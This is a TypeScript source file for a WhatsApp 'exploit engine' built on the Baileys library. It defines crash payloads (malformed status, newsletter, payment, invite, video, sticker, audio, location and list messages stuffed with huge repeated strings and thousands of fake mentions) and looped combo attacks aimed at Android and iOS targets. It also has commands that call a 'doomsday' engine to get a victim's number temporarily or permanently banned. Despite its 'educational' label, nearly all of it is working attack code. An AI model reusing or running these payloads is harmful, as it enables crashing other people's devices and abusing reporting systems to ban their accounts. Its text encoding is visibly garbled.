/**
 * â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
 * â•‘                        CORTANA EXPLOIT ENGINE v3.0                        â•‘
 * â•‘                  Primis Bug Base - Death Edition                           â•‘
 * â•‘                     For Educational Purposes Only                          â•‘
 * â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 */

import { generateWAMessageFromContent, proto } from '@whiskeysockets/baileys';
import * as crypto from 'crypto';
import { doomsdayEngine } from './ban-engine';

// Simple colored logging
const log = {
    red: (msg: string) => console.log(`\x1b[31m${msg}\x1b[0m`),
    green: (msg: string) => console.log(`\x1b[32m${msg}\x1b[0m`),
    yellow: (msg: string) => console.log(`\x1b[33m${msg}\x1b[0m`),
    blue: (msg: string) => console.log(`\x1b[34m${msg}\x1b[0m`),
};

// Helper: Delay function
const sleep = (ms: number) => new Promise(r => setTimeout(r, ms));

// Helper: Generate Message Tag
function generateMessageTag() {
    return Date.now().toString(36) + Math.random().toString(36).substring(2);
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// PRIMIS BUG BASE - CORE EXPLOIT FUNCTIONS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

/**
 * Status Mention Bug (ã¸ã‚ã¯)
 * Type: WhatsApp Status Mention Crash
 */
async function StatusMentionBug(sock: any, targetJid: string) {
    await sock.relayMessage(targetJid, {
        groupMentionedMessage: {
            message: {
                listResponseMessage: {
                    title: {
                        newsletterJid: "13135550002@s.whatsapp.net",
                        serverMessageId: "STATUS_MENTION_MESSAGE",
                        id: generateMessageTag()
                    },
                    type: "STATUS_MENTION_MESSAGE"
                }
            }
        }
    }, {});

    log.green("[StatusMentionBug] âœ“ Sent to " + targetJid);
}

/**
 * Newsletter Forward Crash Type 1 (ã‚ã¤ã«ãŸ)
 * Type: Forwarded Newsletter Crash
 */
async function NewsletterCrashV1(sock: any, targetJid: string, ptcp: boolean = false) {
    const payload = {
        newsletterForwardMessage: {
            displayText: ("ğ‘†·ğ‘†µğ‘†´ğ‘†¿").repeat(39998),
            newsletterJid: "628570966492-1627579259@g.us",
            groupInviteMessage: "relayMessage + participant",
            groupInviteMessageCode: "h+64P9RhJDzgXSPf",
            body: "ğŸ§ªâƒŸê™°âŒ ÒŠğŸ©¸âƒŸâƒ¨ã€Šâƒ°â€£ â–ğŸ­âƒŸà¼‘âŒâƒ°ğğ«ğ¢Í¢ğ¦ğ¢ğ¬ ğ‘ªÍ¢ğ’“ğ’‚Í¯Í¢ğ’”ğ’‰à½€ÍœÍ¡ğŸ‰ Ò‰ÒŠâ‰›âƒâƒŸâƒ âƒ¤ê™°ê™²ê™±â€±áœ†á¢£",
            captionText: null
        }
    };

    await sock.sendMessage(targetJid, payload, ptcp ? {
        remoteJid: { jid: targetJid }
    } : {});

    log.green("[NewsletterCrashV1] âœ“ Sent to " + targetJid);
}

/**
 * Newsletter Forward Crash Type 2 (ã¾ã†ã¯ã‘ã²ã†)
 * Type: Similar to Type 1, different encoding
 */
async function NewsletterCrashV2(sock: any, targetJid: string, ptcp: boolean = false) {
    const payload = {
        newsletterForwardMessage: {
            displayText: "à½¹".repeat(130000),
            newsletterJid: "628570966492-1627579259@g.us",
            groupInviteMessage: "relayMessage + participant",
            groupInviteMessageCode: "h+64P9RhJDzgXSPf",
            body: "ğŸ§ªâƒŸê™°âŒ ÒŠğŸ©¸âƒŸâƒ¨ã€Šâƒ°â€£ â–ğŸ­âƒŸà¼‘âŒâƒ°ğğ«ğ¢Í¢ğ¦ğ¢ğ¬ ğ‘ªÍ¢ğ’“ğ’‚Í¯Í¢ğ’”ğ’‰à½€ÍœÍ¡ğŸ‰ Ò‰ÒŠâ‰›âƒâƒŸâƒ âƒ¤ê™°ê™²ê™±â€±áœ†á¢£",
            captionText: null
        }
    };

    await sock.sendMessage(targetJid, payload, ptcp ? {
        remoteJid: { jid: targetJid }
    } : {});

    log.green("[NewsletterCrashV2] âœ“ Sent to " + targetJid);
}

/**
 * Payment Request Crash (ã¸ã‚ã¯)
 * Type: Malicious Payment Invoice
 */
async function PaymentCrash(sock: any, targetJid: string, ptcp: boolean = false) {
    const payload = {
        interactiveMessage: {
            body: "ğŸ­âƒŸà¼‘âŒâƒ°ğğ«ğ¢Í¢ğ¦ğ¢ğ¬ ğ‘ªÍ¢ğ’“ğ’‚Í¯Í¢ğ’”ğ’‰à½€ÍœÍ¡ğŸ‰âƒœ".repeat(50000),
            nativeFlowMessage: {
                buttons: [{
                    name: "review_and_pay",
                    buttonParamsJson: JSON.stringify({
                        currency: "XOF",
                        payment_configuration: "",
                        payment_type: "",
                        total_amount: {
                            value: 999999999,
                            offset: 100
                        },
                        reference_id: "CORTANA CRASHED",
                        type: "physical-goods",
                        order: {
                            status: "payment_requested",
                            descripiton: "",
                            subtotal: {
                                value: 0,
                                offset: 100
                            },
                            order_type: "PAYMENT_REQUEST",
                            items: [{
                                retailer_id: "custom-item-69d62566-4850-469a-b192-a6fd9f58cc14",
                                name: null,
                                amount: {
                                    value: 999999999,
                                    offset: 100
                                },
                                quantity: 1
                            }]
                        },
                        additional_note: null,
                        native_payment_methods: [],
                        share_payment_status: false
                    })
                }]
            },
            contextInfo: {
                mentionedJid: Array.from({ length: 5000 }, () => {
                    return "0@s.wh" + Math.floor(Math.random() * 10000000) + "@s.whatsapp.net"
                }),
                serverMessageId: "STATUS_MENTION_MESSAGE",
                newsletterJid: "120372052502080@newsletter",
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    forwardingScore: true,
                    newsletterJid: "120372052502080@newsletter",
                    forwardedNewsletterMessageInfo: {
                        body: {
                            text: " Telegram: @cortana ".repeat(15000),
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "FlowResponse galaxy_message",
                            paramsJson: "Cortana".repeat(522500),
                            version: 3
                        }
                    }
                }
            }
        }
    };

    await sock.sendMessage(targetJid, payload, ptcp ? {
        remoteJid: { jid: targetJid }
    } : {});

    log.green("[PaymentCrash] âœ“ Sent to " + targetJid);
}

/**
 * Group Invite Crash (ã¦ã¦ã‚€ã™ã­)
 * Type: Malicious Group Invite with Delay
 */
async function GroupInviteCrash(sock: any, targetJid: string, ptcp: boolean = true) {
    const payload = {
        groupInviteMessage: {
            groupJid: "628570966492-1627579259@g.us",
            inviteCode: "h+64P9RhJDzgXSPf",
            inviteExpiration: parseInt((Date.now() / 1000).toString()) + 999,
            groupName: "ğŸ©¸âƒŸà¼‘âŒâƒ°ğŸ­âƒŸà¼‘âŒâƒ°ğ‚ğğ‘ğ“ğ€ğğ€ ğ‚Í¢ğ«ğšÍ¯Í¢ğ¬ğ¡à½€ÍœÍ¡ğŸ‰ Ò‰ÒŠâ‰›âƒâƒŸâƒ âƒ¤ê™°ê™²ê™±â€±áœ†á¢£",
            caption: "ğŸ©¸âƒŸà¼‘âŒâƒ° CORTANA Crash".repeat(300),
            jpegThumbnail: ""
        }
    };

    await sock.relayMessage(targetJid, payload, ptcp ? {
        participant: { jid: targetJid }
    } : {});

    log.green("[GroupInviteCrash] âœ“ Sent to " + targetJid);
}

/**
 * Delayed Invite Type 1 (ã†ã‚ˆã‚€ã«)
 */
async function DelayedInviteV1(sock: any, targetJid: string, ptcp: boolean = true) {
    const payload = {
        groupInviteMessage: {
            groupJid: "628570966492@g.us",
            inviteCode: "Code",
            inviteExpiration: parseInt((Date.now() / 1000).toString()) + 999,
            groupName: "ğŸ©¸âƒŸà¼‘âŒâƒ°ğŸ­âƒŸà¼‘âŒâƒ°ğ‚ğğ‘ğ“ğ€ğğ€ ğ‚Í¢ğ«ğšÍ¯Í¢ğ¬ğ¡à½€ÍœÍ¡ğŸ‰ Ò‰ÒŠâ‰›âƒâƒŸâƒ âƒ¤ê™°ê™²ê™±â€±áœ†á¢£",
            caption: "ğŸ©¸âƒŸà¼‘âŒâƒ° CORTANA".repeat(300),
            jpegThumbnail: ""
        }
    };

    await sock.relayMessage(targetJid, payload, ptcp ? {
        participant: { jid: targetJid }
    } : {});

    log.green("[DelayedInviteV1] âœ“ Sent to " + targetJid);
}

/**
 * Delayed Invite Type 2 (ã¾ã†ã¬ã¸)
 */
async function DelayedInviteV2(sock: any, targetJid: string, ptcp: boolean = true) {
    const payload = {
        groupInviteMessage: {
            groupJid: "628570966492@g.us",
            inviteCode: "h+64P9RhJDzgXSPf",
            groupName: " CORTANA".repeat(1999),
            jpegThumbnail: "",
            caption: "Ã°Â©".repeat(100)
        }
    };

    await sock.relayMessage(targetJid, payload, ptcp ? {
        participant: { jid: targetJid }
    } : {});

    log.green("[DelayedInviteV2] âœ“ Sent to " + targetJid);
}

/**
 * Video Message Crash (ã¸ã„ãŸ)
 */
async function VideoCrash(sock: any, targetJid: string, ptcp: boolean = true) {
    const payload = {
        videoMessage: {
            url: "https://crazy.apple.com".repeat(25000) + "/eId",
            mimetype: "video/mp4",
            fileSha256: "âƒÒ‰âƒÒ‰âƒÒ‰âƒÒ‰âƒ",
            fileLength: 107374182400,
            seconds: 99999,
            mediaKey: "âƒÒ‰âƒÒ‰âƒÒ‰âƒÒ‰âƒ",
            caption: "",
            height: 9999,
            width: 9999,
            fileEncSha256: "",
            interactiveAnnotations: [],
            directPath: "",
            mediaKeyTimestamp: Date.now(),
            jpegThumbnail: "",
            contextInfo: {
                mentionedJid: Array.from({ length: 5000 }, () => {
                    return "1" + Math.floor(Math.random() * 500000000000) + "@s.whatsapp.net"
                }),
                groupMentions: [],
                forwardingScore: 1,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363298524333143@newsletter",
                    newsletterName: "ğŸ­âƒŸà¼‘âŒâƒ°ğ‚ğğ‘ğ“ğ€ğğ€ ğ‘ªÍ¢ğ’“ğ’‚Í¯Í¢ğ’”ğ’‰à½€ÍœÍ¡ğŸ‰",
                    serverMessageId: 999
                }
            }
        }
    };

    await sock.relayMessage(targetJid, payload, ptcp ? {
        participant: { jid: targetJid }
    } : {});

    log.green("[VideoCrash] âœ“ Sent to " + targetJid);
}

/**
 * Extended Text Crash (ãŸã®ã²ã²ãµãŠ)
 */
async function ExtendedTextCrash(sock: any, targetJid: string, ptcp: boolean = true) {
    const payload = {
        extendedTextMessage: {
            text: "ê¦¾".repeat(77777),
            contextInfo: {
                mentionedJid: Array.from({ length: 5000 }, () => {
                    return "1" + Math.floor(Math.random() * 500000000000) + "@s.whatsapp.net"
                }),
                groupMentions: [],
                forwardingScore: 1,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363298524333143@newsletter",
                    newsletterName: " Â© CORTANA",
                    serverMessageId: 999
                },
                externalAdReply: {
                    title: "ğ‚ğğ‘ğ“ğ€ğğ€ ğ‚ğ«ğšğ¬ğ¡",
                    body: "",
                    mediaType: 1,
                    thumbnailUrl: "https://crazy.apple.com".repeat(25000),
                    thumbnail: "",
                    sourceUrl: "https://",
                    renderLargerThumbnail: false
                }
            }
        }
    };

    await sock.relayMessage(targetJid, payload, ptcp ? {
        participant: { jid: targetJid }
    } : {});

    log.green("[ExtendedTextCrash] âœ“ Sent to " + targetJid);
}

/**
 * Sticker Crash (ãŠã†ã‚‚ãã†ã¤)
 */
async function StickerCrash(sock: any, targetJid: string, ptcp: boolean = true) {
    const payload = {
        stickerMessage: {
            url: "https://crazy.apple.com".repeat(25000),
            fileSha256: "âƒÒ‰âƒÒ‰âƒÒ‰âƒÒ‰âƒ",
            fileEncSha256: "",
            mediaKey: "âƒÒ‰âƒÒ‰âƒÒ‰âƒÒ‰âƒ",
            mimetype: "image/webp",
            height: 9999,
            width: 9999,
            directPath: "",
            fileLength: 999999,
            mediaKeyTimestamp: Date.now(),
            isAnimated: false,
            contextInfo: {
                mentionedJid: Array.from({ length: 5000 }, () => {
                    return "1" + Math.floor(Math.random() * 500000000000) + "@s.whatsapp.net"
                }),
                groupMentions: [],
                forwardingScore: 1,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363298524333143@newsletter",
                    newsletterName: "ê¦¾ CORTANA",
                    serverMessageId: 999
                }
            }
        }
    };

    await sock.relayMessage(targetJid, payload, ptcp ? {
        participant: { jid: targetJid }
    } : {});

    log.green("[StickerCrash] âœ“ Sent to " + targetJid);
}

/**
 * Audio Crash (ã¡ã™ã‚„ã‚†ã¸)
 */
async function AudioCrash(sock: any, targetJid: string, ptcp: boolean = true) {
    const payload = {
        audioMessage: {
            url: "https://crazy.apple.com".repeat(25000),
            mimetype: "audio/opus",
            fileSha256: "âƒÒ‰âƒÒ‰âƒÒ‰âƒÒ‰âƒ",
            fileLength: 900000000,
            seconds: 999999,
            ptt: true,
            mediaKey: "âƒÒ‰âƒÒ‰âƒÒ‰âƒÒ‰âƒ",
            fileEncSha256: "",
            directPath: "",
            mediaKeyTimestamp: Date.now(),
            contextInfo: {
                mentionedJid: Array.from({ length: 5000 }, () => {
                    return "1" + Math.floor(Math.random() * 500000000000) + "@s.whatsapp.net"
                }),
                groupMentions: [],
                forwardingScore: 1,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363298524333143@newsletter",
                    newsletterName: "ğŸ­âƒŸà¼‘âŒâƒ°ğ‚ğğ‘ğ“ğ€ğğ€ ğ‘ªÍ¢ğ’“ğ’‚Í¯Í¢ğ’”ğ’‰à½€ÍœÍ¡ğŸ‰",
                    serverMessageId: 999
                }
            }
        }
    };

    await sock.relayMessage(targetJid, payload, ptcp ? {
        participant: { jid: targetJid }
    } : {});

    log.green("[AudioCrash] âœ“ Sent to " + targetJid);
}

/**
 * Location Crash (ãŠã“ã‚†ã­)
 */
async function LocationCrash(sock: any, targetJid: string, ptcp: boolean = true) {
    const payload = {
        locationMessage: {
            degreesLatitude: 9.09999262999,
            degreesLongitude: 199.99963118999,
            address: "https://crazy.apple.com".repeat(25000),
            url: "",
            isLive: false,
            accuracyInMeters: 0,
            speedInMps: 0,
            degreesClockwiseFromMagneticNorth: 0,
            jpegThumbnail: "",
            contextInfo: {
                mentionedJid: Array.from({ length: 5000 }, () => {
                    return "1" + Math.floor(Math.random() * 500000000000) + "@s.whatsapp.net"
                }),
                groupMentions: [],
                forwardingScore: 1,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363298524333143@newsletter",
                    newsletterName: "ğŸ­âƒŸà¼‘âŒâƒ°ğ‚ğğ‘ğ“ğ€ğğ€ ğ‘ªÍ¢ğ’“ğ’‚Í¯Í¢ğ’”ğ’‰à½€ÍœÍ¡ğŸ‰",
                    serverMessageId: 999
                }
            }
        }
    };

    await sock.relayMessage(targetJid, payload, ptcp ? {
        participant: { jid: targetJid }
    } : {});

    log.green("[LocationCrash] âœ“ Sent to " + targetJid);
}

/**
 * List Message Crash (ã‚ˆã‚‚ã²ã›ã²ã‚„)
 */
async function ListCrash(sock: any, targetJid: string, ptcp: boolean = true) {
    const payload = {
        listMessage: {
            title: "ğŸ­âƒŸà¼‘âŒâƒ°ğ‚ğğ‘ğ“ğ€ğğ€ ğ‘ªÍ¢ğ’“ğ’‚Í¯Í¢ğ’”ğ’‰à½€ÍœÍ¡ğŸ‰",
            description: " CORTANA Crash".repeat(300),
            buttonText: "",
            footerText: "",
            listType: 2,
            sections: [{
                title: "CORTANA",
                rows: Array.from({ length: 1000 }, () => ({
                    title: "ğŸ¦ ",
                    description: "",
                    rowId: Math.random().toString()
                }))
            }],
            contextInfo: {
                mentionedJid: Array.from({ length: 5000 }, () => {
                    return "1" + Math.floor(Math.random() * 500000000000) + "@s.whatsapp.net"
                }),
                groupMentions: [],
                forwardingScore: 1,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363298524333143@newsletter",
                    newsletterName: " CORTANA",
                    serverMessageId: 1000
                }
            }
        }
    };

    await sock.relayMessage(targetJid, payload, ptcp ? {
        participant: { jid: targetJid }
    } : {});

    log.green("[ListCrash] âœ“ Sent to " + targetJid);
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// COMBINED ATTACK FUNCTIONS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

/**
 * Android Force Close (30x Loop)
 */
async function AndroidFC(sock: any, targetJid: string) {
    log.yellow(`[AndroidFC] Starting 30x attack on ${targetJid}`);
    for (let i = 0; i < 30; i++) {
        await StatusMentionBug(sock, targetJid);
        await sleep(100);
    }
    log.green(`[AndroidFC] âœ“ Completed 30x on ${targetJid}`);
}

/**
 * Force Close Once (Powerful One-Shot)
 */
async function FCOnce(sock: any, targetJid: string) {
    log.yellow(`[FCOnce] Sending powerful one-shot to ${targetJid}`);
    await PaymentCrash(sock, targetJid);
    await GroupInviteCrash(sock, targetJid);
    log.green(`[FCOnce] âœ“ Completed on ${targetJid}`);
}

/**
 * Delayed Android Attack (25x Loop)
 */
async function DelayAndro(sock: any, targetJid: string) {
    log.yellow(`[DelayAndro] Starting 25x delayed attack on ${targetJid}`);
    for (let i = 0; i < 25; i++) {
        await DelayedInviteV1(sock, targetJid, true);
        await DelayedInviteV2(sock, targetJid);
        await sleep(200);
    }
    log.green(`[DelayAndro] âœ“ Completed 25x on ${targetJid}`);
}

/**
 * Delayed iOS Attack (25x Loop)
 */
async function DelayiOS(sock: any, targetJid: string) {
    log.yellow(`[DelayiOS] Starting 25x iOS attack on ${targetJid}`);
    for (let i = 0; i < 25; i++) {
        await DelayedInviteV1(sock, targetJid, true);
        await DelayedInviteV2(sock, targetJid);
        await VideoCrash(sock, targetJid);
        await sleep(200);
    }
    log.green(`[DelayiOS] âœ“ Completed 25x on ${targetJid}`);
}

/**
 * iOS Invisible Crash (30x Loop)
 */
async function iOSCrash(sock: any, targetJid: string) {
    log.yellow(`[iOSCrash] Starting 30x iOS invisible attack on ${targetJid}`);
    for (let i = 0; i < 30; i++) {
        await ExtendedTextCrash(sock, targetJid);
        await StickerCrash(sock, targetJid);
        await AudioCrash(sock, targetJid);
        await sleep(100);
    }
    log.green(`[iOSCrash] âœ“ Completed 30x on ${targetJid}`);
}

/**
 * Full XCrash Combo (All Bugs)
 */
async function XCrash(sock: any, targetJid: string) {
    log.yellow(`[XCrash] Starting FULL COMBO attack on ${targetJid}`);

    // Phase 1: Delayed attacks
    for (let i = 0; i < 10; i++) {
        await DelayedInviteV1(sock, targetJid, true);
        await sleep(100);
    }

    // Phase 2: Direct crashes
    for (let i = 0; i < 15; i++) {
        await StatusMentionBug(sock, targetJid);
        await sleep(50);
    }

    // Phase 3: Payment crash
    await PaymentCrash(sock, targetJid);

    // Phase 4: Media crashes
    await VideoCrash(sock, targetJid);
    await StickerCrash(sock, targetJid);
    await AudioCrash(sock, targetJid);

    // Phase 5: Location and list flood
    await LocationCrash(sock, targetJid);
    await ListCrash(sock, targetJid);

    log.green(`[XCrash] âœ“ FULL COMBO completed on ${targetJid}`);
}

/**
 * EDU Combo (Educational Jammer)
 */
async function EduCombo(sock: any, targetJid: string) {
    log.yellow(`[EduCombo] Starting EDU attack on ${targetJid}`);

    for (let i = 0; i < 20; i++) {
        await ExtendedTextCrash(sock, targetJid);
        await ListCrash(sock, targetJid);
        await sleep(150);
    }

    log.green(`[EduCombo] âœ“ Completed on ${targetJid}`);
}


// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// MAIN EXPORT: Execute Exploit
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
export async function executeExploit(sock: any, command: string, target: string) {
    // Validate target before doing anything
    if (!target || target.trim() === '' || target === 'null' || target === 'undefined') {
        log.yellow('âš ï¸ No target provided - exploit cancelled');
        return false;
    }

    const jid = target.includes('@') ? target : `${target}@s.whatsapp.net`;

    // Additional validation - must have a valid number
    const numberPart = jid.split('@')[0];
    if (!numberPart || numberPart.length < 6 || !/^[\d:]+$/.test(numberPart)) {
        log.yellow(`âš ï¸ Invalid target: ${numberPart} - exploit cancelled`);
        return false;
    }

    log.red(`â˜ ï¸ Executing ${command} on ${jid}`);

    try {
        switch (command.toLowerCase()) {
            // â•â•â•â•â•â•â• ANDROID ATTACKS â•â•â•â•â•â•â•
            case 'cortana-andro-fc':
                await AndroidFC(sock, jid);
                break;

            case 'cortana-fc-one':
                await FCOnce(sock, jid);
                break;

            case 'cortana-delay-andro':
                await DelayAndro(sock, jid);
                break;

            // â•â•â•â•â•â•â• iOS ATTACKS â•â•â•â•â•â•â•
            case 'cortana-ios-crash':
                await iOSCrash(sock, jid);
                break;

            case 'cortana-delay-ios':
                await DelayiOS(sock, jid);
                break;

            // â•â•â•â•â•â•â• FULL COMBO â•â•â•â•â•â•â•
            case 'cortana-xcrash':
                await XCrash(sock, jid);
                break;

            case 'edu-combo':
                await EduCombo(sock, jid);
                break;

            // â•â•â•â•â•â•â• INDIVIDUAL CRASHES â•â•â•â•â•â•â•
            case 'cortana-status-crash':
                await StatusMentionBug(sock, jid);
                break;

            case 'cortana-payment-crash':
                await PaymentCrash(sock, jid);
                break;

            case 'cortana-invite-crash':
                await GroupInviteCrash(sock, jid);
                break;

            case 'cortana-video-crash':
                await VideoCrash(sock, jid);
                break;

            case 'cortana-text-crash':
                await ExtendedTextCrash(sock, jid);
                break;

            case 'cortana-sticker-crash':
                await StickerCrash(sock, jid);
                break;

            case 'cortana-audio-crash':
                await AudioCrash(sock, jid);
                break;

            case 'cortana-location-crash':
                await LocationCrash(sock, jid);
                break;

            case 'cortana-list-crash':
                await ListCrash(sock, jid);
                break;

            case 'cortana-newsletter-v1':
                await NewsletterCrashV1(sock, jid);
                break;

            case 'cortana-newsletter-v2':
                await NewsletterCrashV2(sock, jid);
                break;

            // â•â•â•â•â•â•â• BAN COMMANDS (DOOMSDAY ENGINE) â•â•â•â•â•â•â•
            case 'perm-ban-num':
                log.red(`â˜ ï¸ PERMANENT BAN STRIKE: ${jid}`);
                try {
                    const permResult = await doomsdayEngine.executePermanentBan(jid.replace('@s.whatsapp.net', ''));
                    log.green(`âœ… Ban probability: ${permResult.banProbability}%`);
                    log.green(`â±ï¸ Estimated ban time: ${permResult.estimatedBanTime}`);
                } catch (e) {
                    console.error('Perm ban error:', e);
                }
                break;

            case 'temp-ban-num':
                log.yellow(`âš ï¸ TEMPORARY BAN STRIKE: ${jid}`);
                try {
                    const tempResult = await doomsdayEngine.executeTemporaryBan(jid.replace('@s.whatsapp.net', ''));
                    log.green(`âœ… Ban probability: ${tempResult.banProbability}%`);
                    log.green(`â±ï¸ Estimated ban time: ${tempResult.estimatedBanTime}`);
                } catch (e) {
                    console.error('Temp ban error:', e);
                }
                break;

            default:
                log.yellow(`Unknown exploit command: ${command}`);
                return false;
        }

        log.green(`âœ… ${command} execution completed on ${jid}`);
        return true;
    } catch (error) {
        log.red('Exploit execution error:');
        console.error(error);
        return false;
    }
}
